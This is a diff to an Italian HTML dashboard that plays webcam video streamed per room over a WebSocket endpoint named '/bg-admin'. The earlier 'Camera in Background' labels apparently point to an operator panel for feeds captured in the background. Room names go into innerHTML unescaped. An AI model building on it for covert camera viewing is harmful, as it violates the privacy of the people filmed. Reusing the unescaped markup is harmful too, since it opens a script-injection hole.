@@ -1,78 +1,33 @@
 <!DOCTYPE html>
 <html lang="it">
 <head>
-  <meta charset="utf-8">
-  <title>Live Background Cam</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Dashboard Cam Live</title>
   <style>
-    body {
-      margin: 0;
-      background: #000;
-      color: #0f0;
-      font-family: Arial, sans-serif;
-      padding: 20px;
-    }
-    .grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-      gap: 15px;
-    }
-    .cam {
-      border: 2px solid #0f0;
-      border-radius: 12px;
-      overflow: hidden;
-      background: #111;
-      position: relative;
-    }
-    .cam img,
-    .cam video {
-      width: 100%;
-      height: auto;
-      display: block;
-      object-fit: contain;
-    }
-    h1 {
-      margin: 0 0 16px 0;
-      font-size: 20px;
-      color: #0f0;
-      text-align: left;
-    }
-    h2 {
-      margin: 0;
-      padding: 8px;
-      background: #0f0;
-      color: #000;
-      font-size: 14px;
-      text-align: center;
-    }
-    .status {
-      color: #0f0;
-      font-size: 12px;
-      text-align: center;
-      padding: 4px;
-      position: absolute;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      background: rgba(0, 0, 0, 0.7);
-    }
+    body { margin:0; background:#000; color:#0f0; font-family:Arial; padding:20px; }
+    h1 { margin-bottom:20px; text-align:center; }
+    .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:15px; }
+    .cam { border:2px solid #0f0; border-radius:12px; overflow:hidden; background:#111; position: relative; }
+    .cam img, .cam video { width:100%; height:auto; display:block; object-fit:contain; }
+    h2 { margin:0; padding:8px; background:#0f0; color:#000; font-size:14px; text-align:center; }
+    .status { color:#0f0; font-size:12px; text-align:center; padding:4px; position:absolute; bottom:0; left:0; right:0; background:rgba(0,0,0,0.7); }
     @media (max-width: 768px) {
-      body { padding: 10px; }
-      .grid { gap: 10px; }
+      body { padding:10px; }
+      .grid { gap:10px; }
     }
   </style>
 </head>
 <body>
-  <h1>Camera in Background</h1>
+  <h1>Live Camera Feed</h1>
   <div id="grid" class="grid"></div>
 
   <script>
     const grid = document.getElementById('grid');
-    const ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + '/bg-admin');
+    const ws = new WebSocket((location.protocol === 'https:' ? 'wss' : 'ws') + '://' + location.host + '/bg-admin');
     const rooms = new Map();
-
-    const mediaSourceSupported = 'MediaSource' in window && MediaSource.isTypeSupported('video/webm; codecs="vp8,opus"');
     const mediaStreams = new Map();
+    const mediaSourceSupported = 'MediaSource' in window;
 
     function createMediaStream(room) {
       const video = document.createElement('video');
@@ -81,119 +36,82 @@
       video.playsInline = true;
       video.muted = true;
 
-      if (!mediaSourceSupported) return { video };
+      if (mediaSourceSupported) {
+        const mediaSource = new MediaSource();
+        video.src = URL.createObjectURL(mediaSource);
 
-      const mediaSource = new MediaSource();
-      video.src = URL.createObjectURL(mediaSource);
-
-      const stream = { video, mediaSource, sourceBuffer: null, queue: [], active: true };
-
-      mediaSource.addEventListener('sourceopen', () => {
-        if (!stream.active) return;
-        try {
-          const sb = mediaSource.addSourceBuffer('video/webm; codecs="vp8,opus"');
-          stream.sourceBuffer = sb;
-
-          sb.addEventListener('updateend', () => {
-            if (stream.queue.length > 0 && !sb.updating && mediaSource.readyState === 'open') {
-              const chunk = stream.queue.shift();
-              sb.appendBuffer(chunk);
+        mediaSource.addEventListener('sourceopen', () => {
+          const sourceBuffer = mediaSource.addSourceBuffer('video/webm; codecs="vp8,opus"');
+          const queue = [];
+          sourceBuffer.addEventListener('updateend', () => {
+            const next = queue.shift();
+            if (next && mediaSource.readyState === 'open') {
+              try { sourceBuffer.appendBuffer(next); } 
+              catch (err) { console.error('appendBuffer error:', err); }
             }
           });
+          mediaStreams.set(room, { video, mediaSource, sourceBuffer, queue });
+        });
+      }
 
-          sb.addEventListener('error', (err) => {
-            console.warn('SourceBuffer error:', err);
-            cleanupStream(room);
-          });
-        } catch (err) {
-          console.error('Failed to init SourceBuffer:', err);
-          cleanupStream(room);
-        }
-      });
-
-      mediaSource.addEventListener('sourceended', () => cleanupStream(room));
-      mediaSource.addEventListener('error', () => cleanupStream(room));
-
-      mediaStreams.set(room, stream);
-      return stream;
-    }
-
-    function cleanupStream(room) {
-      const stream = mediaStreams.get(room);
-      if (!stream) return;
-      stream.active = false;
-
-      try {
-        if (stream.sourceBuffer && stream.mediaSource?.readyState === 'open') {
-          stream.mediaSource.removeSourceBuffer(stream.sourceBuffer);
-        }
-      } catch {}
-      try {
-        if (stream.video.src) URL.revokeObjectURL(stream.video.src);
-      } catch {}
-
-      mediaStreams.delete(room);
+      return video;
     }
 
     ws.onmessage = async (e) => {
       try {
         if (e.data instanceof Blob) {
-          const room = localStorage.getItem('lastRoom');
-          if (!room) return;
-
-          const stream = mediaStreams.get(room);
-          if (!mediaSourceSupported) return;
+          const lastRoom = localStorage.getItem('lastRoom');
+          if (!lastRoom) return;
+          const stream = mediaStreams.get(lastRoom);
 
           if (!stream) {
-            const newStream = createMediaStream(room);
-            const container = document.getElementById('img-' + room)?.parentElement;
-            if (container) container.replaceChild(newStream.video, document.getElementById('img-' + room));
-            return;
-          }
-
-          // Skip if buffer is not ready or already closed
-          if (
-            !stream.sourceBuffer ||
-            stream.sourceBuffer.updating ||
-            !stream.mediaSource ||
-            stream.mediaSource.readyState !== 'open'
-          ) {
-            return;
-          }
-
-          const arrayBuffer = await e.data.arrayBuffer();
-          try {
-            stream.sourceBuffer.appendBuffer(arrayBuffer);
-          } catch (err) {
-            if (err.name === 'InvalidStateError') {
-              console.warn('SourceBuffer invalid, recreating...');
-              cleanupStream(room);
-              createMediaStream(room);
+            const video = createMediaStream(lastRoom);
+            const container = document.getElementById('img-' + lastRoom).parentElement;
+            container.replaceChild(video, document.getElementById('img-' + lastRoom));
+          } else if (stream.mediaSource.readyState === 'open') {
+            const arrayBuffer = await e.data.arrayBuffer();
+            if (stream.sourceBuffer.updating) {
+              stream.queue.push(arrayBuffer);
             } else {
-              console.error('appendBuffer error:', err);
+              try {
+                stream.sourceBuffer.appendBuffer(arrayBuffer);
+              } catch (err) {
+                console.warn('appendBuffer fallito:', err);
+                if (stream.mediaSource.readyState !== 'open') {
+                  mediaStreams.delete(lastRoom);
+                }
+              }
             }
+            const statusEl = document.getElementById('status-' + lastRoom);
+            if (statusEl) statusEl.textContent = 'Live';
+          }
+        } else {
+          const data = JSON.parse(e.data);
+          const { room, timestamp, offline } = data;
+          if (offline) {
+            const status = document.getElementById('status-' + room);
+            if (status) status.textContent = 'Offline';
+            return;
           }
 
-          const st = document.getElementById('status-' + room);
-          if (st) st.textContent = 'Live';
-        } else {
-          // Gestione metadati
-          const { room, timestamp } = JSON.parse(e.data);
           localStorage.setItem('lastRoom', room);
-
           if (!rooms.has(room)) {
             const div = document.createElement('div');
             div.className = 'cam';
             div.innerHTML = `
               <h2>${room}</h2>
-              <img id="img-${room}" alt="Stream ${room}">
-              <div class="status" id="status-${room}">Online</div>`;
+              <img id="img-${room}">
+              <div class="status" id="status-${room}">Online</div>
+            `;
             grid.appendChild(div);
             rooms.set(room, div);
           }
 
-          const st = document.getElementById('status-' + room);
-          if (st) st.textContent = 'Live - ' + new Date(timestamp).toLocaleTimeString();
+          const statusEl = document.getElementById('status-' + room);
+          if (statusEl) {
+            const date = new Date(timestamp);
+            statusEl.textContent = 'Live - ' + date.toLocaleTimeString();
+          }
         }
       } catch (err) {
         console.error('Error processing message:', err);
